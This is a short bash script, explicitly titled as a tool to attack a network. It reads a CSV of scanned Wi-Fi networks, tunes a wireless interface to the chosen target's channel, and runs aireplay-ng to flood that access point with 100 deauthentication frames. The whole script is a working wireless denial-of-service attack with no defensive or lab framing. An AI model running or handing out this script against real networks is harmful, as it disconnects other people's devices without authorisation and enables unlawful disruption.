# Script to attack entire network

# Load BSSIDs and ESSIDs into an associative array
declare -A networks
declare -A channels
while IFS=, read -r bssid first last channel speed privacy cipher authentication power numBeacons numIV lanIP lenID essid key
do
	if [[ "$lanIP" = *[!\ ]* ]]; then
		if [ "$essid" != " ESSID" ]; then
			networks["$bssid"]="$essid"
			channels["$bssid"]="$channel"
		fi
	fi
done < bigData-01.csv

# Check if any networks were found
if [ "${#networks[@]}" -eq 0 ]; then
	echo "No Networks Detected"
else
	# Attack a network
	# Prompt Operator for network to attack:
	invalid=true
	echo "Attacking network $1"
	# set channel to channel the targeted network is on
	targetChannel=${channels["$1"]}
	# trim leading whitespace
	targetChannel=${targetChannel##*( )}
	#echo "Target Channel: $targetChannel"
	#sudo iwconfig wlan0 channel 11
	sudo iwconfig wlan1 channel $targetChannel
	# send attack to selected network
	sudo aireplay-ng --deauth 100 -a $1 -D wlan1
fi
